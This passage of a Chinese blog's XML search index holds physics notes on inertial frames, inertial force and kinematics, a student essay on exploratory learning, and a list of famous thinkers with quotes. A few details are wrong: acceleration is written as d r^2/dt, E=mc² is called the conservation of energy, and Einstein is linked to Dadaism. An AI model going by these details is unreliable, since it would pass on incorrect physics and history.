href="#惯性系" class="headerlink" title="惯性系"></a>惯性系</h3><ul><li>牛顿定律成立的参考系称为<strong>惯性系</strong>。<ul><li>相对惯性系作<strong>匀速直线运动</strong>的参照系也是<strong>惯性系</strong></li><li>相对惯性系作<strong>加速运动</strong>的参照系是<strong>非惯性系</strong><br><img src="/img/physic_cpt2_01.png" alt></li></ul></li></ul><h4 id="伽利略相对性原理（力学相对性原理）"><a href="#伽利略相对性原理（力学相对性原理）" class="headerlink" title="伽利略相对性原理（力学相对性原理）"></a>伽利略相对性原理（力学相对性原理）</h4><ul><li>一个相对于<strong>惯性系</strong>作<strong>匀速直线运动</strong>的参考系，在其内部发生的一切力学过程，都<strong>不受系统运动的影响</strong>。</li><li><strong>不可能</strong>利用在惯性系内部进行的任何力学实验来<strong>确定该系统做匀速直线运动的速度</strong>。称之为伽利略相对性原理或力学相对性原理。</li><li>力学定律在所有惯性系中都是相同的。</li><li><strong>相对于一切惯性系做匀速直线运动的一切参考系都是惯性系</strong>。</li></ul><ul><li>例：<br><img src="/img/physic_cpt2_02.png" alt><br><img src="/img/physic_cpt1_03.jpg" alt></li><li><strong>结论</strong>：对于不同惯性系，牛顿力学的规律都具有相同的形式，在一惯性系内部作任何力学实验都不能确定该惯性系相对其他惯性系是否在运动</li></ul><h3 id="非惯性系"><a href="#非惯性系" class="headerlink" title="非惯性系"></a>非惯性系</h3><ul><li>例：<br><img src="/img/physic_cpt2_04.png" alt><br><img src="/img/physic_cpt2_05.png" alt></li><li><strong>结论</strong>：在非惯性系中，牛顿定律不成立</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>惯性系：<strong>牛顿定律成立的参考系</strong>。一切相对于惯性系作匀速直线运动的参考系也是惯性系。</li></ul><ul><li>非惯性系：<strong>相对于惯性系作加速运动的参考系</strong>。在非惯性系内牛顿定律不成立。<ul><li>如果要在非惯性系中借用牛顿定律形式研究物体的运动，需要引入<strong>惯性力</strong></li></ul></li></ul><h2 id="惯性力"><a href="#惯性力" class="headerlink" title="惯性力"></a>惯性力</h2><ul><li>定义：为了要使牛顿第二定律在非惯性系内成立而引进的一个虚构的力。<ul><li><strong>惯性力没有施力者，不存在“力是物体之间的相互作用”这一特性。它和真实力有区别</strong>。惯性力的<strong>实质是物体的惯性在非惯性系中的表现</strong>。</li></ul></li><li>大小：等于运动质点的质量 m 与非惯性系加速度 a 的乘积。</li><li>方向：<strong>与非惯性系加速度的方向相反</strong>。<script type="math/tex">\overrightarrow{Q}=-m\overrightarrow{a}</script></li></ul><ul><li>在非惯性系中，牛顿运动定律表示为：<script type="math/tex">\overrightarrow{F} + \overrightarrow{Q} = m\overrightarrow{a}</script><br><img src="/img/physic_cpt2_06.png" alt></li><li><strong>$F_0$ 是虚构的惯性力</strong></li></ul><h2 id="转动参考系"><a href="#转动参考系" class="headerlink" title="转动参考系"></a>转动参考系</h2><ul><li>例：<br><img src="/img/physic_cpt2_07.png" alt><br><img src="/img/physic_cpt2_08.png" alt></li><li><strong>$F_0$ 是虚构的惯性离心力</strong></li></ul><h2 id="牛顿定律是瞬时的规律"><a href="#牛顿定律是瞬时的规律" class="headerlink" title="牛顿定律是瞬时的规律"></a>牛顿定律是瞬时的规律</h2><ul><li>但在有些问题中， 如：碰撞（宏观）、散射 （微观） …</li><li>我们往往只关心过程中力的效果:<center>——力对时间和空间的积累效应。</center></li></ul><p><img src="/img/physic_cpt2_09.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Mathematic&amp;Physic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Physic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>质点运动学</title>
      <link href="/2023/04/14/Physic/Chapter_1/"/>
      <url>/2023/04/14/Physic/Chapter_1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="质点运动学"><a href="#质点运动学" class="headerlink" title="质点运动学"></a>质点运动学</h1><h2 id="坐标系"><a href="#坐标系" class="headerlink" title="坐标系"></a>坐标系</h2><ul><li>自然坐标系：<ul><li>以质点运动方向为正方向</li><li>曲线长度 s 作为质点位置坐标<ul><li>切向单位矢量$\overrightarrow{e_r}$：沿曲线<strong>切线</strong>、指向坐标轴<strong>正方向</strong></li><li>法向单位矢量$\overrightarrow{e_n}$：沿曲线<strong>法线</strong>、指向曲线的<strong>凹侧</strong></li></ul></li></ul></li><li>直角坐标系：可用坐标$(x,y,z)$表示</li></ul><h3 id="位置矢量"><a href="#位置矢量" class="headerlink" title="位置矢量"></a>位置矢量</h3><ul><li>位置矢量（简称位矢）：<ul><li>定义：参考点O指向空间点P$(x,y,z)$的<strong>有向线段</strong></li><li>表达式：$\overrightarrow{r_P} = \overrightarrow{OP} = x\overrightarrow{i} + y\overrightarrow{j} + z\overrightarrow{k}$</li><li>位矢的大小：$r=|\overrightarrow{r}|=\sqrt{x^2+y^2+z^2}$</li></ul></li><li>位矢增量（位移）：<ul><li>定义：空间点A$(x_1,y_1,z_1)$指向空间点B$(x_2,y_2,z_2)的<strong>有向线段</strong></li><li>表达式：$\overrightarrow{AB} = \Delta\overrightarrow{r}=\overrightarrow{r_B} - \overrightarrow{r_A}$</li><li>位移大小：$|\Delta\overrightarrow{r}|=|\overrightarrow{r_B} - \overrightarrow{r_A}|$</li></ul></li><li><strong>注意：</strong> 区分<strong>位移的大小</strong>和<strong>位矢大小的增量</strong><ul><li>位移的大小：$|\Delta\overrightarrow{r}|=|\overrightarrow{r_B} - \overrightarrow{r_A}|$</li><li>位矢大小的增量：$\Delta r=|\overrightarrow{r_B}| - |\overrightarrow{r_A}|=r_B-r_A$</li><li>一般情况下，$|\Delta\overrightarrow{r}|\neq \Delta r$</li></ul></li><li>运动方程：$f(x, y, z)$： <script type="math/tex">x=x(t) \\ y=y(t) \\ z=z(t) \\ 消去t得 f(x, y, z)=0</script></li><li>运动方程矢量式：$\overrightarrow{r}(t)=x(t)\overrightarrow{i} + y(t)\overrightarrow{j} + z(t)\overrightarrow{k}$</li><li>位移矢量：$\Delta\overrightarrow{r}=\overrightarrow{r<em>{t}}-\overrightarrow{r</em>{0}}$</li></ul><h3 id="速度-amp-速率"><a href="#速度-amp-速率" class="headerlink" title="速度&amp;速率"></a>速度&amp;速率</h3><ul><li>平均速度$\overline{\overrightarrow{v}}=\dfrac{\Delta{\overrightarrow{r}}}{\Delta{t}}$，瞬时速度$\overrightarrow{v}=\dfrac{\mathbb{d}\overrightarrow{r}}{\mathbb{d}t}$</li><li>平均速率$\overline{v}=\dfrac{\Delta{s}}{\Delta{t}}$，瞬时速率：$v=|\overrightarrow{v}|$</li></ul><h3 id="加速度"><a href="#加速度" class="headerlink" title="加速度"></a>加速度</h3><ul><li>平均加速度：$\overline{\overrightarrow{a}}=\dfrac{\Delta\overrightarrow{v}}{\Delta t}$</li><li>瞬时加速度：$\overrightarrow{a}=\lim\limits_{\Delta t \to 0}\dfrac{\Delta\overrightarrow{v}}{\Delta t}=\dfrac{\mathbb{d}\overrightarrow{v}}{\mathbb{d}t}=\dfrac{\mathbb{d}r^2}{\mathbb{d}t}$</li></ul><h2 id="圆周运动在自然坐标系的表示"><a href="#圆周运动在自然坐标系的表示" class="headerlink" title="圆周运动在自然坐标系的表示"></a>圆周运动在自然坐标系的表示</h2><h3 id="角"><a href="#角" class="headerlink" title="角"></a>角</h3><ul><li>角位置：$\theta$</li><li>角位移：$\Delta\theta$</li><li>平均角速度：$\overline\omega=\dfrac{\Delta\theta}{\Delta{t}}$，瞬时角速度：$\omega=\dfrac{\mathbb{d}\theta}{\mathbb{d}t}$</li><li>角加速度：$\alpha=\dfrac{\mathbb{d}\omega}{\mathbb{d}t}$</li></ul><h3 id="圆周运动"><a href="#圆周运动" class="headerlink" title="圆周运动"></a>圆周运动</h3><ul><li>切向加速度：$\overrightarrow{a_t}=\dfrac{\mathbb{d}v}{\mathbb{d}t}\overrightarrow{e_t}$（速度<strong>大小</strong>变化引起）</li><li>法向加速度：$\overrightarrow{a_n}=\dfrac{v^2}{r}\overrightarrow{e_n}$（速度<strong>方向</strong>变化引起）</li></ul><h3 id="线量与角量"><a href="#线量与角量" class="headerlink" title="线量与角量"></a>线量与角量</h3><ul><li>$v=\omega r$</li><li>$\overrightarrow{a_t}=\alpha r \overrightarrow{e_t}$</li><li>$\overrightarrow{a_n}=\omega^2 r \overrightarrow{e_n}$</li></ul><h2 id="相对运动"><a href="#相对运动" class="headerlink" title="相对运动"></a>相对运动</h2><ul><li>运动的描述是<strong>相对的</strong>。<strong>同一物体</strong>在<strong>不同参考系</strong>中测量的状态量具有某些<strong>定量</strong>关系。</li><li>对于两个坐标系：S系 与 S’系<ul><li>S系描述的物理量：$\overrightarrow{r} \enspace \overrightarrow{v} \enspace \overrightarrow{a}$</li><li>S’系描述的物理量：$\overrightarrow{r’} \enspace \overrightarrow{v’} \enspace \overrightarrow{a’}$<br><img src="/img/physic_cpt1_01.jpg" alt><br><img src="/img/physic_cpt1_02.jpg" alt></li></ul></li></ul><h3 id="关于非惯性系"><a href="#关于非惯性系" class="headerlink" title="关于非惯性系"></a>关于非惯性系</h3><ul><li>$v<em>{绝对}=v</em>{相对}+v_{牵连}$（牵连速度是<strong>非惯性系本身的速度</strong>）<br><img src="/img/physic_cpt1_03.jpg" alt><br><img src="/img/physic_cpt1_04.jpg" alt></li><li>$\overrightarrow{F}=\overrightarrow{F’}+\overrightarrow{F_{惯性力}}$（非惯性系本身受到外力，在非惯性系中体现为参考系内的物体受到此外力的<strong>反向力</strong>，这个力被称为<strong>惯性力</strong>）</li></ul><h2 id="两大问题"><a href="#两大问题" class="headerlink" title="两大问题"></a>两大问题</h2><ol><li><p>微分法：已知 $\overrightarrow{r}=\overrightarrow{r}(t)$，求任意时刻 $\overrightarrow{v}(t)$，$\overrightarrow{a}(t)$</p><script type="math/tex; mode=display">\overrightarrow{v}=\dfrac{\mathbb{d}\overrightarrow{r}}{\mathbb{d}t}\qquad\overrightarrow{a}=\dfrac{\mathbb{d}r^2}{\mathbb{d}t}</script></li><li><p>积分法：已知 $\overrightarrow{v_0}$，$\overrightarrow{r_0}$ 及 $\overrightarrow{a}=\overrightarrow{a}(t)$ 或 $\overrightarrow{v}=\overrightarrow{v}(t)$，求任意时刻 $\overrightarrow{v}$，$\overrightarrow{r}(t)$</p><script type="math/tex; mode=display">\overrightarrow{a}=\dfrac{\mathbb{d}\overrightarrow{v}}{\mathbb{d}t}\quad \Rightarrow \quad\int_{\overrightarrow{v_0}}^{\overrightarrow{v_t}}d\overrightarrow{v}=\int_{0}^{t}\overrightarrow{a}dt\quad \Rightarrow \quad\overrightarrow{v}(t)-\overrightarrow{v_0}=\int_0^t\overrightarrow{a}dt</script><script type="math/tex; mode=display">\overrightarrow{v}=\dfrac{d\overrightarrow{r}}{dt}\quad \Rightarrow \quad\int_{\overrightarrow{r_0}}^{\overrightarrow{r_t}}d\overrightarrow{r}=\int_{0}^{t}\overrightarrow{v}dt\quad \Rightarrow \quad\overrightarrow{r}(t)-\overrightarrow{r_0}=\int_0^t\overrightarrow{v}dt</script></li></ol>]]></content>
      
      
      <categories>
          
          <category> Mathematic&amp;Physic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Physic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于系统探索学习法</title>
      <link href="/2023/03/18/Misc/%E4%B8%89%E4%B8%AA%E7%9B%92%E5%AD%90/"/>
      <url>/2023/03/18/Misc/%E4%B8%89%E4%B8%AA%E7%9B%92%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="关于系统探索学习法"><a href="#关于系统探索学习法" class="headerlink" title="关于系统探索学习法"></a>关于系统探索学习法</h1><p>课下我尝试使用系统探索学习法来学习使用微信开发者工具，基本按老师的方法探索了image等组件。此外，我还用此方法学习了一些html和python，还用此方法解决了我今天博客部署过程中遇到的问题，接下来我讲详细说说此学习方法给我在各个项目的学习中给我的感受。</p><h2 id="微信开发者工具"><a href="#微信开发者工具" class="headerlink" title="微信开发者工具"></a>微信开发者工具</h2><p>个人觉得微信官网导入一些组件示范性代码很有用，个人学过一点点html做过一些web开发，所以对部分组件理解也觉得比较容易，通过阅读探索这些代码的位置和单词大概的意思就可以大概猜测到如何使用。因此，个人觉得学习如果有基础，学习小程序也许有些部分是不需要教程的，只需要一些示范性的代码供探索就可以了。而且微信开发者工具自带的调试页面很方便用来探索学习，因为可以随时在左侧演示栏看到效果。</p><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><p>个人闲暇时间学了一点点html，有一个网站很推荐：<a href="https://www.w3school.com.cn/">3wschool.com</a>他的html栏有一栏非常好：你可以使用他们的html编辑器，然后你他会为你提供一些示范代码，你可以自由尝试去写你的html代码，它的编辑器自带一个效果演示的窗口，你可以<strong>随时生成你刚刚写的html</strong>。个人觉得<strong>对于简单的代码</strong>这种学习方法比找书看视频效率高。</p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>python自带一个很强大的学习工具：IDLE。它可以立即执行你输入的一行代码或一个代码块，<strong>你可以自由的尝试，遇到不会的就输入help</strong>。他不需要像c/c++那样使用编译器然后再运行，尝试探索的效率比较高。个人觉得这种工具很适合探索学习。同时，很多控制台应用也可以这么学习，比如个人最近学习linux的时候，遇到问题很多时候在网上找几篇博客不如直接输入—help来得快。探索学习也体现出一种优势：<strong>能锻炼独立解决问题的能力，而不是有问题就Google，搜不到就放弃的cv程序员。</strong></p><h2 id="博客部署"><a href="#博客部署" class="headerlink" title="博客部署"></a>博客部署</h2><p>寒假个人制作了一个博客网页<a href="momoyeyu.github.io">[链接]</a>，开学之后经久没有更新，结果今天发现博客目录下的hexo和git指令都显示command not found，node和npm路径也都不识别，导致我没法把文章更新到网站上了。</p><p>我推测是我之前误删了系统Path导致很多指令无法识别，当时导致我ipconfig等系统指令都用不了，后来自己在c盘找到之后添加path就结局了。</p><p>所以这次我认为问题可能差不多，我就去自己设置了一下Path，结果还是不行。于是我尝试谷歌，依然是几篇博客都没有解决问题。但我想说的是不是别人的博客不行，而是<strong>每个人配置的路径等细节不一样，博客的东西可以参考但没法照搬</strong>。后来我是自己想到用node的setup包进行repair来自动修复了指令找不到的问题（一般的安装包都有类似repair的功能，这是之前装python的时候遇到过，这次就<strong>推测</strong>）。</p><p>命令都找回来了，可是博客部署还是失败，这次也没搜博客了，就看报错内容，大概意思是文件夹不是git文件夹，我就知道是git出问题。<strong>有之必然，无之必不然</strong>指的就是git，然后再部署文件夹git init就挂上了，解决问题，然后我就把上次同行计划的文章作为测试部署在博客上了，可以去我的博客看到那篇文章。</p><p>这个案例也让我发现探索学习法的几个优势：<strong>独立解决问题的能力，推测问题举一反三的能力。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于系统探索学习发，我列出以下几个特点：  </p><ul><li><strong>效率不高</strong></li><li>锻炼<strong>独立解决问题</strong>的能力</li><li>锻炼<strong>举一反三</strong>的能力</li><li>需要<strong>结合其他方法</strong>才能体现优势</li><li>容易形成<strong>经验</strong></li><li>探索有前提，而且有上限</li></ul><p>系统探索学习法最大的优点个人觉得是可以让人在探索过程中<strong>获得经验</strong>，与学习获得知识记忆不同，这些经验是<strong>更长久而且更靠谱的</strong>，然后这些经验还可以化作你去<strong>对相似的东西举一反三进行推测的能力</strong>，而且有了这些经验，你将<strong>不依赖于向他人求答案</strong>，而是<strong>倾向于用自己的经验来解决问题</strong>。</p><p>系统探索学习法的不足就是开始很慢，而且个人觉得在很多项目的学习<strong>最开始我们是不应该使用系统探索学习法</strong>的。怎么理解这个<strong>最开始</strong>呢？就好比让一个没有写过任何代码的人去看微信官方给的示例代码，他也只会望而生畏；再通俗夸张点，你让个不认识几个英文单词的人去看代码，他是没法通过代码的单词来推测的！当然这是为了突出<strong>最开始</strong>这个概念才这么说。最开始的时候，个人觉得<strong>还是需要通过学习现成资料来获得一定的知识，再去探索</strong>，否则这种探索只是在瞎子摸黑，即使太阳再亮也没用。你也可以这么理解：一个系统有一些部分是他最基础或相对很基础的组成部分，想要探索这个系统，<strong>至少要先对这个系统比较基础的部分都有认识</strong>，然后才去探索这个系统。再比如学习泛型编程的语言，<strong>我们可以推测</strong>一个函数可以在其他类型的数据结构也可以使用，<strong>但你必须要先知道这个函数本身</strong>是干什么的。而且很多时候，我们在能很轻易地找到资料的情况下，探索的意义确实不大，不如在知道正确的后多应用几次。最后还有一个缺点，就是探索是有上限的，简单的探索我们可以推测，<strong>复杂的我们再去推测无异于去猜密码，容易让人挫败。</strong></p><p>总而言之，这种方法可取，但许多时候要结合其他方法，比如看书看博客看视频等。对于很<strong>容易搜索到答案的东西</strong>，我们去探索学习的<strong>效率并不高</strong>，但对于<strong>难搜索找到清晰答案的</strong>，系统探索学习法不失为一个<strong>好方法</strong>。</p><p>以上就是我对系统探索学习法的认识，谢谢。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创新创业思考课题</title>
      <link href="/2023/03/18/Misc/%E5%90%8C%E8%A1%8C%E8%AE%A1%E5%88%92-%E4%B8%8E%E5%A4%A7%E5%B8%88%E5%90%8C%E8%A1%8C/"/>
      <url>/2023/03/18/Misc/%E5%90%8C%E8%A1%8C%E8%AE%A1%E5%88%92-%E4%B8%8E%E5%A4%A7%E5%B8%88%E5%90%8C%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="同行计划"><a href="#同行计划" class="headerlink" title="同行计划"></a>同行计划</h1><p>假定你面临三体3罗辑的局面，你需要保护人类的思想，并在未来带着这些思想在宇宙中流浪，而且你能够携带的人类伟大思想是有限的，你计划携带哪些思想？</p><h2 id="亚里士多德"><a href="#亚里士多德" class="headerlink" title="亚里士多德"></a>亚里士多德</h2><p><img src="https://iknow-pic.cdn.bcebos.com/6a600c338744ebf846a0b291d5f9d72a6159a74f?x-bce-process%3Dimage%2Fresize%2Cm_lfit%2Cw_600%2Ch_800%2Climit_1%2Fquality%2Cq_85%2Fformat%2Cf_jpg" alt></p><ul><li>对人性和理性保持怀疑，主张法制</li><li>法制不来源于人的理性或思考，而来自历史</li><li>希腊三贤之一</li><li>马克思曾称亚里士多德是古希腊哲学家中最博学的人物</li><li>恩格斯称他是“古代的黑格尔”</li><li>百科全书式的科学家</li></ul><p><img src="https://img0.baidu.com/it/u=3358970226,2407525997&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=375" alt><br><strong>名言：</strong></p><ul><li>吾爱吾师，吾更爱真理。</li><li>人生最终价值在于觉醒和思考的能力，而不只在于生存。</li><li>人类是天生的社会性动物，没有人会愿意孤独的活在这个世界，他的本性要求他，必须要与他人一起生活。</li><li>没有一个人能全面把握真理。</li><li>即使上帝也无法改变过去。</li></ul><p><strong>著作：</strong></p><ul><li>《工具论》</li><li>《物理学》</li><li>《形而上学》</li><li>《伦理学》</li><li>《政治学》</li></ul><h2 id="柏拉图"><a href="#柏拉图" class="headerlink" title="柏拉图"></a>柏拉图</h2><p><img src="https://preview.qiantucdn.com/paixin/24/86/09/13558PICnXqVn2SAcIekn_PIC2018.jpg%21w1024_new_0" alt></p><ul><li>西方客观唯心主义的创始人</li><li>理念世界和现象世界</li><li>柏拉图式爱情学说</li><li>建立完整的教育体系</li><li>希腊三贤之一</li></ul><p><strong>名言：</strong></p><ul><li>在短暂的生命里寻找永恒。</li><li>不知道自己无知，乃是双倍的无知。</li><li>爱是美好带来的欢欣，智慧创造的奇观，神仙赋予的惊奇。缺乏爱的人渴望得到它，拥有爱的人万般珍惜它。</li><li>思维是灵魂的自我谈话</li><li>初期教育应是一种娱乐，这样才更容易发现一个人天生的爱好</li><li>人不仅为自己而生，而且为祖国活着。</li></ul><p><strong>著作：</strong></p><ul><li>《理想国》</li></ul><h2 id="达·芬奇"><a href="#达·芬奇" class="headerlink" title="达·芬奇"></a>达·芬奇</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/32fa828ba61ea8d3fd1fe2786143274e251f95caf23f?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></p><ul><li>欧洲文艺复兴时期的杰出代表人物</li><li>与米开朗基罗、拉斐尔并称“文艺复兴后三杰”</li></ul><p><img src="https://bkimg.cdn.bcebos.com/pic/fd039245d688d43f87948116ec54c51b0ef41ad58db7?x-bce-process=image/resize,m_lfit,w_440,limit_1" alt><br><strong>名言：</strong></p><ul><li>真理只有一个，它不在宗教中，而是在科学中。</li><li>应当耐心听取他人的意见，认真考虑指责你的人是否有理，如果他有理，你就修正自己的错误，如果他理亏，只当没听见，若他是一个你所敬重的人，那么可以通讨论提出他不正确的地方。</li><li>有天资的人，当他们工作得最少的时候，实际上是他们工作得最多的时候，因为他们是在构思，并把想法酝酿成熟，这些想法随后就通过他们的手表达出来。</li><li>你如果要做一个艺术家，你要牢记：必须开拓你的胸襟，务使心如明镜，能够照见一切事物，一切色彩。</li><li>我不想用画笔捕捉世界，我想改变它！</li></ul><p>著作：</p><ul><li>蒙娜丽莎<br><img src="https://bkimg.cdn.bcebos.com/pic/f703738da977391276bc886af3198618367ae227?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></li><li>最后的晚餐<br><img src="https://bkimg.cdn.bcebos.com/pic/95eef01f3a292df53d442166be315c6034a8733a?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></li><li>哈默手稿</li></ul><h2 id="尼古拉·哥白尼"><a href="#尼古拉·哥白尼" class="headerlink" title="尼古拉·哥白尼"></a>尼古拉·哥白尼</h2><p><img src="https://5b0988e595225.cdn.sohucs.com/images/20171021/d516814197d74d099e73b40c7f597863.jpeg" alt></p><ul><li>文艺复兴时期的巨人</li><li>创立日心说，开创现代天文学</li><li>推翻托勒密学说，将天文学从陈旧科学观和宗教错误神学束缚下解放</li><li>近代科学的飞跃，现代科学的起点</li><li>为伽利略和开普勒的成就奠定基础</li></ul><p><strong>名言：</strong></p><ul><li>人的天职在勇于探索真理。</li><li>在许多问题上我的说法跟前人大不相同，但是我的知识得归功于他们，也归功于那些最先为这门学说开辟道路的人。</li><li>我们必须睁开双眼，面对事实。</li></ul><p><strong>著作：</strong></p><ul><li>《天球运行论》</li></ul><h2 id="弗朗西斯·培根"><a href="#弗朗西斯·培根" class="headerlink" title="弗朗西斯·培根"></a>弗朗西斯·培根</h2><p><img src="https://img.doc.xuehai.net/pic/67f66f61148afe9ee799be03/1-810-jpg_6-1080-0-0-1080.jpg" alt></p><ul><li>实验科学创始人，科学归纳法创始人</li><li>开创了反亚里士多德的技术实践论</li><li>实践观念</li><li>近代自然科学直接或感性的创造者</li><li>经验主义</li></ul><p><strong>名言：</strong></p><ul><li>实践中的失败主要由于不知道原因而发生，正是在这种情况下，人的两种企望：对知识和力量的企望真正相和在一起了。</li><li>掌握知识不是为了争论不休，不是为了藐视别人，不是为利益、荣誉、权力或者达到某种目的，而是为了用于生活。</li><li>研究真理认识真理喝相信真理，乃是人性中最高的美德。</li><li>太过重视行为规则与拘泥形式，以致在事业上坐失良机，那损失是很大的。</li></ul><p><strong>著作：</strong></p><ul><li>《新工具》</li><li>《学术的进步》</li></ul><h2 id="伽利略·伽利雷"><a href="#伽利略·伽利雷" class="headerlink" title="伽利略·伽利雷"></a>伽利略·伽利雷</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/9e3df8dcd100baa1cd11a7139140ae12c8fcc3ce8040?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></p><ul><li>“观测天文学之父”</li><li>“现代物理学之父”</li><li>“科学方法之父”</li><li>“现代科学之父”</li><li>主张用具体的实验来认识自然规律</li></ul><p><strong>名言：</strong></p><ul><li>数理科学是大自然的语言。</li><li>一切推理都必须从观察与实验得来。</li><li>与其夸大胡说，不如宣布那个聪明的、智巧的、谦逊的警句：“我不知道。”</li><li>科学的真理不应该在古代圣人的蒙着灰尘的书上去找，而应该在实验中和以实验为基础的理论中去找。</li></ul><p><strong>主要成就：</strong></p><ul><li>分析动力学</li><li>日心</li><li>运动学</li><li>观测天文学</li></ul><h2 id="艾萨克·牛顿"><a href="#艾萨克·牛顿" class="headerlink" title="艾萨克·牛顿"></a>艾萨克·牛顿</h2><p><img src="https://n.sinaimg.cn/sinakd20200425ac/444/w750h494/20200425/5b90-isuiksm8304374.jpg" alt></p><ul><li>“近代物理学之父”</li><li>发明反射式望远镜和光的色散原理</li><li>当今最有影响力的科学家</li></ul><p><strong>名言：</strong></p><ul><li>如果说我比别人看的略为远些，那是因为我是站在巨人们的肩膀上。</li><li>我的成就，当归功于精微的思索。</li><li>把简单的事情考虑得很复杂，可以发现新领域；把复杂的现象看得很简单，可以发现新定律。</li></ul><p><strong>著作：</strong></p><ul><li>《自然哲学的数学原理》</li><li>《光学》</li></ul><p><strong>主要成就：</strong></p><ul><li>牛顿三定律</li><li>与莱布尼茨独立发展出了微积分学</li><li>发现二项式定理</li><li>提出光的微粒说</li><li>确定了冷却定律</li></ul><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p><img src="https://img1.baidu.com/it/u=111017342,3278810959&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=693" alt></p><ul><li>提出光量子假说，解决了光电效应问题</li><li>创立了狭义相对论、广义相对论等</li><li>获得诺贝尔物理学奖</li><li>参加反战和平运动</li><li>达达主义</li><li>量子场概念的开创者</li><li>爱因斯坦教育理念</li></ul><p><img src="https://bkimg.cdn.bcebos.com/pic/8601a18b87d6277fbc7eee5d23381f30e924fc63?x-bce-process=image/resize,m_lfit,w_440,limit_1" alt><br><strong>名言：</strong></p><ul><li>在科学上，每一条道路都应该走一走。发现一条走不通的道路，就是对于科学的一大贡献。</li><li>人在科学探索的道路上，走过弯路，犯过错误，并不是坏事，更不是什么耻辱，要在实践中勇于承认和改正错误。</li><li>不要试图去做一个成功的人，要努力成为一个有价值的人。</li><li>有两种看待人生的方式， 一种是生活不存在奇迹， 另一种则是， 所有的一切都是奇迹。</li><li>想像力比知识更重要，正因知识是有限的，而想像力概括着世界上的一切，推动着进步，并且是知识进步的源泉。</li><li>我没有什么特殊的天赋，只是拥有无比强烈的好奇心罢了。</li></ul><p><strong>著作：</strong></p><ul><li>《我的世界观》</li><li>《统一场论》</li></ul><p><strong>主要成就：</strong></p><ul><li>狭义相对论</li><li>广义相对论</li><li>光电效应</li><li>能量守恒定律 E=mc²</li><li>宇宙常数</li></ul><h2 id="奥托·冯·俾斯麦"><a href="#奥托·冯·俾斯麦" class="headerlink" title="奥托·冯·俾斯麦"></a>奥托·冯·俾斯麦</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/500fd9f9d72a6059967849982834349b023bbacc?x-bce-process=image/resize,m_lfit,w_440,limit_1" alt></p><ul><li>建立了世界上最早的工人养老金、健康医疗保险制度、社会保险。</li><li>铁血政策</li><li>列宁评价他说：“俾斯麦依照自己的方式，依照容克的方式完成了历史上进步的事业。”</li></ul><p><img src="https://bkimg.cdn.bcebos.com/pic/9345d688d43f879433d94fa3d51b0ef41bd53a1c?x-bce-process=image/resize,m_lfit,w_1280,limit_1" alt><br><strong>名言：</strong></p><ul><li>这个时代的重大的问题不是演说和决议所能解决的……这些问题只有铁和血才能解决。</li><li>每个新手都会从自己的教训中吸取经验，聪明人则从专业团队的帮助中获益。</li></ul><h2 id="格奥尔吉·康斯坦丁诺维奇·朱可夫"><a href="#格奥尔吉·康斯坦丁诺维奇·朱可夫" class="headerlink" title="格奥尔吉·康斯坦丁诺维奇·朱可夫"></a>格奥尔吉·康斯坦丁诺维奇·朱可夫</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/c9fcc3cec3fdfc03429427dcdf3f8794a5c226e2?x-bce-process=image/resize,m_lfit,w_440,limit_1" alt></p><ul><li>苏德战争中指挥斯大林格勒战役、列宁格勒战役、柏林战役</li><li>第二次世界大战中最优秀的将领之一</li></ul><p><strong>名言：</strong></p><ul><li>人员武器军事思想——这是一支军队的三个基本要素。</li><li>一直缺乏战术训练的部队就不得不在作战过程中付出巨大的代价来补课。</li></ul><h2 id="亚当·斯密"><a href="#亚当·斯密" class="headerlink" title="亚当·斯密"></a>亚当·斯密</h2><p><img src="https://bkimg.cdn.bcebos.com/pic/b90e7bec54e736d160b891a391504fc2d46269f5?x-bce-process=image/resize,m_lfit,w_536,limit_1" alt></p><ul><li>政治哲学、伦理学、经济学主要创立者</li><li>古典经济学的“开山鼻祖”</li></ul><p><strong>名言：</strong></p><ul><li>人天生，并且永远，是自私的动物。</li><li>我们在这个世界上辛苦劳作，来回奔波是为了什么？所有这些贪婪和欲望，所有这些对财富、权力和名声的追求，其目的到底何在呢？归根结底，是为了得到他人的爱和认同。</li><li>一个事业若对社会有益，就应当任其自由、广其竞争，竞争愈自由，愈普遍，那事业就愈有利于社会。</li><li>每个人在追求自身利益时，都会”被一只看不见的手”引导着去达到并非出于其本意的目的</li></ul><p><strong>著作：</strong></p><ul><li>《国富论》</li><li>《道德情操论》</li></ul><h2 id="约翰·梅纳德·凯恩斯"><a href="#约翰·梅纳德·凯恩斯" class="headerlink" title="约翰·梅纳德·凯恩斯"></a>约翰·梅纳德·凯恩斯</h2><p><img 